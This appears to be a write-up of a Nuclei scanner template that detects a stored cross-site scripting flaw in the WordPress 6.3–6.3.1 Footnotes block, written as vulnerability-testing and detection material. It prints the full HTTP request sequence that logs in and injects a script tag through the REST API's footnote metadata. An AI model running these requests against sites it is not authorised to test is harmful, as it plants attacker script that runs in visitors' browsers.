# Nuclei Template: WordPress 6.3-6.3.1 Footnotes Block - Cross-Site Scripting
**Template ID:** wp-footnote-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`wp-footnote-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress does not escape some of its Footnotes block options before outputting them back in a page/post where the block is embed.

## Impact
This could allow users with the contributor role and above to perform Stored Cross-Site Scripting attacks.

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

GET /wp-admin/post-new.php HTTP/1.1
Host: {{Hostname}}

POST /?rest_route=/wp/v2/posts/{{postid}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
X-HTTP-Method-Override: PUT
X-WP-Nonce: {{nonce}}

{
  "id": {{postid}},
  "title": "Stored XSS via Footnote Block",
  "content": "<!-- wp:paragraph -->\n<p>Test CVE<sup data-fn=\"testid\" class=\"fn\"><a href=\"#testid\" id=\"testid-link\">1</a></sup></p>\n<!-- /wp:paragraph -->\n\n<!-- wp:footnotes /-->",
  "meta": {
    "footnotes": "[{\"content\":\"<script>alert(document.domain)</script>\",\"id\":\"testid\"}]"
  },
  "status": "pending"
}

GET /?p={{postid}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-core/wordpress-core-63-631-authenticatedcontributor-cross-site-scripting-via-footnotes-block?asset_slug=wordpress
- https://wpscan.com/vulnerability/63270b61-dddd-4cc0-a091-a04cb4f682ec/
